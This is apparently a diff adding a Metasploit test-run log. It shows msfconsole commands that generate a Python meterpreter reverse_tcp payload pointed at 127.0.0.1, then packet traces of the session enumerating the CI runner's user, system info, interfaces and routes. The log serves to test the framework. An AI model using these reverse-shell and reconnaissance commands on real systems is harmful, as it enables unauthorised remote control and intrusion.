@@ -1,0 +1,920 @@
+use python/meterpreter/reverse_tcp
+msf6 post(test/meterpreter) > generate -o D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220206-2448-1h9awo.py -f raw AutoVerifySessionTimeout=10 MeterpreterTryToFork=false PythonMeterpreterDebug=true lport=6007 lhost=127.0.0.1
+msf6 payload(python/meterpreter/reverse_tcp) > [*] Writing 493 bytes to D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220206-2448-1h9awo.py...
+msf6 payload(python/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 6
+msf6 payload(python/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6007 
+[*] Sending stage (39804 bytes) to 127.0.0.1
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=16 command=core_negotiate_tlv_encryption>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="35481222715690357834632102611147">
+  #<Rex::Post::Meterpreter::Tlv type=RSA-PUB-KEY     meta=RAW        value="0\x82\x01\"0\r\x06\t*\x86H\x86\xF7\r\x01\x01\x01\ ...">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=16 command=core_negotiate_tlv_encryption>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=SYM-KEY-TYPE    meta=INT        value=1>
+  #<Rex::Post::Meterpreter::Tlv type=ENC-SYM-KEY     meta=RAW        value="S\x8C\r\x02nt\x00\x87\f\xF7SD\xDDl\xAE\xF1(\xFE\x ...">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="35481222715690357834632102611147">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=10 command=core_enumextcmd>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="70106267324177487225243743543012">
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=LENGTH          meta=INT        value=1000>
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=10 command=core_enumextcmd>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=2>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=3>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=4>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=5>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=6>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=7>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=8>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=10>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=11>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=12>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=13>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=15>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=16>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=17>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=21>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=22>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=23>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=24>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=25>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=27>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=28>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=29>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=30>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=32>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=33>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="70106267324177487225243743543012">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=10 command=core_enumextcmd>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="24735985546140130521363876640660">
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1000>
+  #<Rex::Post::Meterpreter::Tlv type=LENGTH          meta=INT        value=1000>
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=10 command=core_enumextcmd>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="24735985546140130521363876640660">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=12 command=core_loadlib>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="93741586006341652876078454191033">
+  #<Rex::Post::Meterpreter::Tlv type=DATA            meta=RAW        value="import fnmatch\nimport getpass\nimport os\nimport ...">
+  #<Rex::Post::Meterpreter::Tlv type=LIBRARY-PATH    meta=STRING     value="ext704522.py">
+  #<Rex::Post::Meterpreter::Tlv type=FLAGS           meta=INT        value=2>
+  #<Rex::Post::Meterpreter::Tlv type=TARGET-PATH     meta=STRING     value="/tmp/ext704522.py">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=12 command=core_loadlib>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1052>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1054>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1055>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1056>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1059>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1068>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1069>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1072>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1077>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1071>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1064>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1065>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1060>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1062>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1063>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1061>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1001>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1003>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1004>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1006>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1007>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1005>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1008>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1009>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1010>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1011>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1013>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1014>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1015>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1016>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1012>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1019>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1022>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1021>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1024>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1025>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1026>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1028>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1029>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1030>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1031>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1033>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1034>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1035>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1036>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1037>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1038>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1039>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1040>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1041>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1042>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1043>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1044>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1045>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1046>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1047>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1048>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1049>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1102>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="93741586006341652876078454191033">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1008 command=stdapi_fs_getwd>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="18607055218690152253225063965633">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1008 command=stdapi_fs_getwd>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-66736   meta=STRING     value="D:/a/metasploit-framework/metasploit-framework">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="18607055218690152253225063965633">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1055 command=stdapi_sys_config_getuid>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="80401466909865772102504866405926">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1055 command=stdapi_sys_config_getuid>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-66578   meta=STRING     value="fv-az159-880\\runneradmin">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="80401466909865772102504866405926">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1059 command=stdapi_sys_config_sysinfo>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="52944392230362891548587569593256">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1059 command=stdapi_sys_config_sysinfo>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-66576   meta=STRING     value="fv-az159-880">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-66580   meta=STRING     value="en_US">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-66577   meta=STRING     value="Windows 2016 (Build 17763)">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-66579   meta=STRING     value="x64">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="52944392230362891548587569593256">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=22 command=core_set_uuid>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="07697722343956435526161820202469">
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xD9\xF1\xBA\xE5\ ...">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=22 command=core_set_uuid>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="07697722343956435526161820202469">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1019 command=stdapi_net_config_get_interfaces>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="62838886513746906492715093124498">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1019 command=stdapi_net_config_get_interfaces>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743257 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-66968   meta=STRING     value="Microsoft Hyper-V Network Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263575  meta=RAW        value="\x00\"Hx\x0F\xE7">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132474  meta=INT        value=1500>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132476  meta=INT        value=13>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263574  meta=RAW        value="\xFE\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132496  meta=INT        value=64>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263574  meta=RAW        value="\n\x01\x008">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132496  meta=INT        value=16>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743257 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-66968   meta=STRING     value="Software Loopback Interface 1">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263575  meta=RAW        value="\x00\x00\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132474  meta=INT        value=4294967295>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132476  meta=INT        value=1>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263574  meta=RAW        value="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132496  meta=INT        value=128>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263574  meta=RAW        value="\x7F\x00\x00\x01">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132496  meta=INT        value=8>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743257 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-66968   meta=STRING     value="Hyper-V Virtual Ethernet Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263575  meta=RAW        value="\x00\x15]\xA7\x14\b">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132474  meta=INT        value=1500>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132476  meta=INT        value=9>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263574  meta=RAW        value="\xFE\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132496  meta=INT        value=64>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263574  meta=RAW        value="\xAC\x13P\x01">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132496  meta=INT        value=20>
+]>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="62838886513746906492715093124498">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1022 command=stdapi_net_config_get_routes>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="06187609527362563616066423031293">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1022 command=stdapi_net_config_get_routes>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\n\x01\x00\x01">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Microsoft Hyper-V Network Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=10>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\n\x01\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Microsoft Hyper-V Network Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=266>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\n\x01\x008">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Microsoft Hyper-V Network Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=266>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\n\x01\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Microsoft Hyper-V Network Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=266>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\x7F\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Software Loopback Interface 1">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=331>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\x7F\x00\x00\x01">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Software Loopback Interface 1">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=331>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\x7F\xFF\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Software Loopback Interface 1">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=331>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xA8?\x81\x10">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\n\x01\x00\x01">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Microsoft Hyper-V Network Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=11>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xA9\xFE\xA9\xFE">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\n\x01\x00\x01">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Microsoft Hyper-V Network Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=11>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xAC\x13P\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xF0\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Hyper-V Virtual Ethernet Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=5256>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xAC\x13P\x01">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Hyper-V Virtual Ethernet Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=5256>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xAC\x13_\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xFF\xFF\xFF\xFF">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Hyper-V Virtual Ethernet Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=5256>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xE0\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xF0\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Software Loopback Interface 1">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=331>
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073743247 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263564  meta=RAW        value="\xE0\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263565  meta=RAW        value="\xF0\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-263566  meta=RAW        value="\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=STRING          meta=STRING     value="Microsoft Hyper-V Network Adapter">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-132515  meta=INT        value=266>
+]>
